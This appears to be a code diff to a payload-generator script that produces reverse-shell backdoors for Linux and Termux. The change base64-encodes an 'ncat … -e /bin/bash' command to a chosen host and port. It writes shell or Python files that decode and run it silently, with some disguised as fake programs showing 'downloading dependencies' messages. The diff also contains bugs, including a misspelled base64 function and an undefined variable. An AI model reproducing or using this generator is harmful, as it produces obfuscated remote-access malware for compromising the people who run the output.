@@ -1,4 +1,5 @@
 import os
+import base64
 import click
 import socket
 serveo=socket.gethostbyname("serveo.net")
@@ -60,53 +61,64 @@ Advanced payload modules>>>>
 [16] linux_termux/fake_program/reverse_tcp
 
 """)
+s=f"ncat {lhost} {lport} -e /bin/bash"
+encoded=base64.b64enconde(s.encode("utf-8"))
+encodeds=encoded.decode("utf-8")
 print("\033[1;35 ")
 payload=input("frsf(choose payload)#> ")
 if payload=="1":
 	print(f"GENERATING PAYLOAD {output}/{name}.sh ")
 	with open(f"{output}/{name}.sh","w+") as f:
-		s=(f"""sudo apt-get install nmap -y &> /dev/null
-sudo apt-get install ncat -y > /dev/null
-ncat {lhost} {lport} -e /bin/bash &> /dev/null
+		s=(f"""c1=$(base64 -d <<< "c3VkbyBhcHQtZ2V0IGluc3RhbGwgbm1hcAo="); status=$?
+[[ $status == 0 ]] && $c &> /dev/null
+c2=$(base64 -d <<< "{encodeds}"); dstatus=$?
+[[ $dstatus == 0 ]] && $c2 &> /dev/null
 		""")
 		f.write(s)
 		os.system(f"chmod +x {output}/{name}.sh ")
 elif payload=="2":
 	print(f"GENERATING PAYLOAD {output}/{name}.sh ")
 	with open(f"{output}/{name}.sh","w+") as f:
-		s=(f"""sudo pacman -S install nmap -y &> /dev/null
-sudo pacman -S install ncat -y &> /dev/null
-ncat {lhost} {lport} -e /bin/bash &> /dev/null
+		s=(f"""c1=$(base64 -d <<< "c3VkbyBwYWNtYW4gLVMgaW5zdGFsbCBubWFwCg=="); status=$?
+[[ $status == 0 ]] && $c &> /dev/null
+c2=$(base64 -d <<< "{encodeds}"); dstatus=$?
+[[ $dstatus == 0 ]] && $c2 &> /dev/null
 		""")
 		f.write(s)
 		os.system(f"chmod +x {output}/{name}.sh ")
 elif payload=="3":
 	print(f"GENERATING PAYLOAD {output}/{name}.sh ")
 	with open(f"{output}/{name}.sh","w+") as f:
-		s=(f"""sudo dnf install nmap-ncat -y &> /dev/null
-ncat {lhost} {lport} -e /bin/bash &> /dev/null
+		s=(f"""c1=$(base64 -d <<< "c3VkbyBkbmYgaW5zdGFsbCBubWFwCg=="); status=$?
+[[ $status == 0 ]] && $c &> /dev/null
+c2=$(base64 -d <<< "{encodeds}"); dstatus=$?
+[[ $dstatus == 0 ]] && $c2 &> /dev/null
 		""")
+		f.write(s)
 		f.write(s)
 		os.system(f"chmod +x {output}/{name}.sh ")
 elif payload=="4":
 	print(f"GENERATING PAYLOAD {output}/{name}.sh ")
 	with open(f"{output}/{name}.sh","w+") as f:
-		s=(f"""sudo yum install nmap-ncat -y &> /dev/null
-ncat {lhost} {lport} -e /bin/bash &> /dev/null
+		s=(f"""c1=$(base64 -d <<< "c3VkbyB5dW0gaW5zdGFsbCBubWFwCg=="); status=$?
+[[ $status == 0 ]] && $c &> /dev/null
+c2=$(base64 -d <<< "{encodeds}"); dstatus=$?
+[[ $dstatus == 0 ]] && $c2 &> /dev/null
 		""")
 		f.write(s)
 		os.system(f"chmod +x {output}/{name}.sh ")
 elif payload=="5":
 	print(f"GENERATING PAYLOAD {output}/{name}.sh ")
 	with open(f"{output}/{name}.sh","w+") as f:
-		s=(f"""apt-get install nmap -y &> /dev/null
-apt-get install ncat -y &> /dev/null
-ncat {lhost} {lport} -e /bin/bash &> /dev/null
+		s=(f"""c1=$(base64 -d <<< "YXB0LWdldCBpbnN0YWxsIG5tYXAK"); status=$?
+[[ $status == 0 ]] && $c &> /dev/null
+c2=$(base64 -d <<< "{encodeds}"); dstatus=$?
+[[ $dstatus == 0 ]] && $c2 &> /dev/null
 		""")
 		f.write(s)
 		os.system(f"chmod +x {output}/{name}.sh ")
 elif payload=="6":
-	print(f"GENERATING PAYLOAD {output}/{name}.sh ")
+	print(f"GENERATING PAYLOAD {output}/{name}.py ")
 	pyload=(f"""import os
 #jhsjkdhsjkghkjsghdkjahkjhgkdjghkjhsakjhdkjhkjhadksjhkjhdsjhj
 #kjhgksjhakjhgkjhdkjhlsdjlakjsdhlkjlakjhsdllsjhlsdhjshdjhsdjhbkj
@@ -124,7 +136,7 @@ os.system(f"ncat {lhost} {lport} -e /bin/bash &> /dev/null")
 	f.write(pyload)
 	f.close()
 elif payload=="7":
-	print(f"GENERATING PAYLOAD {output}/{name}.sh")
+	print(f"GENERATING PAYLOAD {output}/{name}.py")
 	pyload=(f"""import os
 #jhsjkdhsjkghkjsghdkjahkjhgkdjghkjhsakjhdkjhkjhadksjhkjhdsjhj
 #kjhgksjhakjhgkjhdkjhlsdjlakjsdhlkjlakjhsdllsjhlsdhjshdjhsdjhbkj
@@ -142,7 +154,7 @@ os.system(f"ncat {lhost} {lport} -e /bin/bash &> /dev/null")
 	f.write(pyload)
 	f.close()
 elif payload=="8":
-	print(f"GENERATING PAYLOAD {output}/{name}.sh ")
+	print(f"GENERATING PAYLOAD {output}/{name}.py ")
 	pyload=(f"""import os
 #jhsjkdhsjkghkjsghdkjahkjhgkdjghkjhsakjhdkjhkjhadksjhkjhdsjhj
 #kjhgksjhakjhgkjhdkjhlsdjlakjsdhlkjlakjhsdllsjhlsdhjshdjhsdjhbkj
@@ -159,7 +171,7 @@ os.system(f"ncat {lhost} {lport} -e /bin/bash &> /dev/null")
 	f.write(pyload)
 	f.close()
 elif payload=="9":
-	print(f"GENERATING PAYLOAD {output}/{name}.sh")
+	print(f"GENERATING PAYLOAD {output}/{name}.py")
 	pyload=(f"""import os
 #jhsjkdhsjkghkjsghdkjahkjhgkdjghkjhsakjhdkjhkjhadksjhkjhdsjhj
 #kjhgksjhakjhgkjhdkjhlsdjlakjsdhlkjlakjhsdllsjhlsdhjshdjhsdjhbkj
@@ -177,7 +189,7 @@ os.system(f"ncat {lhost} {lport} -e /bin/bash &> /dev/null")
 	f.close()
 
 elif payload=="10":
-	print(f"GENERATING PAYLOAD {output}/{name}.sh ")
+	print(f"GENERATING PAYLOAD {output}/{name}.py ")
 	pyload=(f"""import os
 #jhsjkdhsjkghkjsghdkjahkjhgkdjghkjhsakjhdkjhkjhadksjhkjhdsjhj
 #kjhgksjhakjhgkjhdkjhlsdjlakjsdhlkjlakjhsdllsjhlsdhjshdjhsdjhbkj
@@ -199,11 +211,12 @@ elif payload=="11":
 	additional=click.prompt("ENTER SOME ADDITONAL DIALOGUES IF YOU NEED,ELSE LEAVE BLANK:", type=str, default=" ")
 	print(f"GENERATING PAYLOAD {output}/{name}.sh ")
 	with open(f"{output}/{name}.sh","w+") as f:
-		s=(f"""sudo apt-get install nmap -y &> /dev/null
-echo -e '\033[5;39m {additional}'
+		s=(f"""echo -e '\033[5;39m {additional}'
 echo -e '\033[5;38m DOWNLOADING dependencies for {name} ..please wait!\n'
-sudo apt-get install ncat -y &> /dev/null
-ncat {lhost} {lport} -e /bin/bash &> /dev/null
+c1=$(base64 -d <<< "c3VkbyBhcHQtZ2V0IGluc3RhbGwgbm1hcAo="); status=$?
+[[ $status == 0 ]] && $c &> /dev/null
+c2=$(base64 -d <<< "{encodeds}"); dstatus=$?
+[[ $dstatus == 0 ]] && $c2 &> /dev/null
 		""")
 		f.write(s)
 		os.system(f"chmod +x {output}/{name}.sh ")
@@ -211,11 +224,12 @@ elif payload=="12":
 	additional=click.prompt("ENTER SOME ADDITONAL DIALOGUES IF YOU NEED,ELSE LEAVE BLANK:", type=str, default=" ")
 	print(f"GENERATING PAYLOAD {output}/{name}.sh ")
 	with open(f"{output}/{name}.sh","w+") as f:
-		s=(f"""sudo pacman -S install nmap -y &> /dev/null
-echo -e '\033[5;39m {additional}'
+		s=(f"""echo -e '\033[5;39m {additional}'
 echo -e '\033[5;38m DOWNLOADING dependencies for {name} ..please wait!\n'
-sudo pacman -S install ncat -y &> /dev/null
-ncat {lhost} {lport} -e /bin/bash &> /dev/null
+c1=$(base64 -d <<< "c3VkbyBwYWNtYW4gLVMgaW5zdGFsbCBubWFwCg=="); status=$?
+[[ $status == 0 ]] && $c &> /dev/null
+c2=$(base64 -d <<< "{encodeds}"); dstatus=$?
+[[ $dstatus == 0 ]] && $c2 &> /dev/null
 		""")
 		f.write(s)
 		os.system(f"chmod +x {output}/{name}.sh ")
@@ -223,11 +237,12 @@ elif payload=="13":
 	additional=click.prompt("ENTER SOME ADDITONAL DIALOGUES IF YOU NEED,ELSE LEAVE BLANK:", type=str, default=" ")
 	print(f"GENERATING PAYLOAD {output}/{name}.sh ")
 	with open(f"{output}/{name}.sh","w+") as f:
-		s=(f"""sudo apt-get install nmap -y &> /dev/null
-echo -e '\033[5;39m {additional}'
-echo -e '\033[5;38m DOWNLOADING dependencies for {name} ..please wait!\n'
-sudo apt-get install ncat -y &> /dev/null
-ncat {lhost} {lport} -e /bin/bash &> /dev/null
+		s=(f"""echo -e '\033[1;39m {additional}'
+echo -e '\033[1;38m DOWNLOADING dependencies for {name} ..please wait!\n'
+c1=$(base64 -d <<< "YXB0LWdldCBpbnN0YWxsIG5tYXAK"); status=$?
+[[ $status == 0 ]] && $c &> /dev/null
+c2=$(base64 -d <<< "{encodeds}"); dstatus=$?
+[[ $dstatus == 0 ]] && $c2 &> /dev/null
 		""")
 		f.write(s)
 		os.system(f"chmod +x {output}/{name}.sh ")
@@ -235,11 +250,12 @@ elif payload=="14":
 	additional=click.prompt("ENTER SOME ADDITONAL DIALOGUES IF YOU NEED,ELSE LEAVE BLANK:", type=str, default=" ")
 	print(f"GENERATING PAYLOAD {output}/{name}.sh ")
 	with open(f"{output}/{name}.sh","w+") as f:
-		s=(f"""sudo apt-get install nmap -y &> /dev/null
-echo -e '\033[5;32m {additional}'
+		s=(f"""echo -e '\033[5;32m {additional}'
 echo -e '\033[5;32m {name} is executing,this may take a while ..please wait!\n'
-sudo apt-get install ncat -y &> /dev/null
-ncat {lhost} {lport} -e /bin/bash &> /dev/null
+c1=$(base64 -d <<< "c3VkbyBhcHQtZ2V0IGluc3RhbGwgbm1hcAo="); status=$?
+[[ $status == 0 ]] && $c &> /dev/null
+c2=$(base64 -d <<< "{encodeds}"); dstatus=$?
+[[ $dstatus == 0 ]] && $c2 &> /dev/null
 		""")
 		f.write(s)
 		os.system(f"chmod +x {output}/{name}.sh ")
@@ -247,11 +263,12 @@ elif payload=="15":
 	additional=click.prompt("ENTER SOME ADDITONAL DIALOGUES IF YOU NEED,ELSE LEAVE BLANK:", type=str, default=" ")
 	print(f"GENERATING PAYLOAD {output}/{name}.sh ")
 	with open(f"{output}/{name}.sh","w+") as f:
-		s=(f"""sudo pacman -S install nmap -y &> /dev/null
-echo -e '\033[5;32m {additional}'
+		s=(f"""echo -e '\033[5;32m {additional}'
 echo -e '\033[5;32m {name} is executing,this may take a while ..please wait!\n'
-sudo apt-get install ncat -y &> /dev/null
-ncat {lhost} {lport} -e /bin/bash &> /dev/null
+c1=$(base64 -d <<< "c3VkbyBwYWNtYW4gLVMgaW5zdGFsbCBubWFwCg=="); status=$?
+[[ $status == 0 ]] && $c &> /dev/null
+c2=$(base64 -d <<< "{encodeds}"); dstatus=$?
+[[ $dstatus == 0 ]] && $c2 &> /dev/null
 		""")
 		f.write(s)
 		os.system(f"chmod +x {output}/{name}.sh ")
@@ -259,11 +276,12 @@ elif payload=="16":
 	additional=click.prompt("ENTER SOME ADDITONAL DIALOGUES IF YOU NEED,ELSE LEAVE BLANK:", type=str, default=" ")
 	print(f"GENERATING PAYLOAD {output}/{name}.sh ")
 	with open(f"{output}/{name}.sh","w+") as f:
-		s=(f"""sudo apt-get install nmap -y &> /dev/null
-echo -e '\033[5;32m {additional}'
+		s=(f"""echo -e '\033[5;32m {additional}'
 echo -e '\033[5;32m {name} is executing,this may take a while ..please wait!\n'
-sudo apt-get install ncat -y &> /dev/null
-ncat {lhost} {lport} -e /bin/bash &> /dev/null
+c1=$(base64 -d <<< "c3VkbyBhcHQtZ2V0IGluc3RhbGwgbm1hcAo="); status=$?
+[[ $status == 0 ]] && $c &> /dev/null
+c2=$(base64 -d <<< "{encodeds}"); dstatus=$?
+[[ $dstatus == 0 ]] && $c2 &> /dev/null
 		""")
 		f.write(s)
 		os.system(f"chmod +x {output}/{name}.sh ")
